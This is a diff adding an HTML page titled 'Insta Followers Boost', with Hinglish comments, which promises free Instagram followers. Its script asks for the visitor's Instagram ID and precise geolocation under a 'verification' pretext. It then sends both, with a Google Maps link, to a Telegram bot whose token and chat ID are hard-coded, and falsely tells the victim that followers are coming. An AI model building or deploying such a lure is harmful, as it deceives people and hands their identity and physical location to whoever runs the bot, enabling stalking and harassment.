@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Insta Followers Boost</title>
+    <style>
+        /* Premium CSS Styling */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            color: #333;
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            width: 90%;
+            max-width: 400px;
+        }
+
+        h1 {
+            margin-bottom: 10px;
+            color: #333;
+        }
+
+        p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            box-sizing: border-box;
+            font-size: 16px;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input:focus {
+            border-color: #dc2743;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #dc2743;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background: #bc1888;
+            transform: scale(1.02);
+        }
+
+        .status {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #28a745;
+            font-weight: bold;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Insta Followers Boost</h1>
+        <p>Apni ID enter karo aur location verify karo followers ke liye.</p>
+        
+        <input type="text" id="instaId" placeholder="Instagram ID (e.g., user123)">
+        <button onclick="submitData()">Get Followers Now</button>
+        
+        <div id="statusMsg" class="status"></div>
+    </div>
+
+    <script>
+        // --- CONFIGURATION AREA ---
+        // Niche apna Telegram Bot Token dalo
+        const BOT_TOKEN = '8690644947:AAE-6DvrASI6zKcKYP_9QlB9OPme8Zj1OQs'; 
+        
+        // Niche apna Telegram Chat ID dalo (jaha message jana hai)
+        const CHAT_ID = '8544722229'; 
+        // --------------------------
+
+        function submitData() {
+            const instaId = document.getElementById('instaId').value;
+            const statusMsg = document.getElementById('statusMsg');
+
+            if (instaId.trim() === "") {
+                alert("Bhai ID enter karo pehle!");
+                return;
+            }
+
+            // Location maangne ka code
+            if (navigator.geolocation) {
+                statusMsg.style.display = 'block';
+                statusMsg.style.color = 'orange';
+                statusMsg.innerText = "Location Check Kar Rahe Hain...";
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        // Location mil gayi
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                        // Telegram pe bhejne ka message
+                        const message = `🔥 *New User Request*\n\n🆔 *Insta ID:* ${instaId}\n📍 *Location:* ${lat}, ${lon}\n🗺 *Map:* ${mapsLink}`;
+
+                        sendToTelegram(message);
+                    },
+                    (error) => {
+                        statusMsg.style.color = 'red';
+                        statusMsg.innerText = "Location access allow karo bhai!";
+                        console.error("Error getting location:", error);
+                    }
+                );
+            } else {
+                alert("Browser location support nahi karta.");
+            }
+        }
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if(data.ok) {
+                    document.getElementById('statusMsg').style.color = 'green';
+                    document.getElementById('statusMsg').innerText = "Data Sent! Followers aa jayenge.";
+                } else {
+                    document.getElementById('statusMsg').style.color = 'red';
+                    document.getElementById('statusMsg').innerText = "Error: Token ya Chat ID check karo.";
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                document.getElementById('statusMsg').style.color = 'red';
+                document.getElementById('statusMsg').innerText = "Connection Error.";
+            });
+        }
+    </script>
+</body>
+</html>
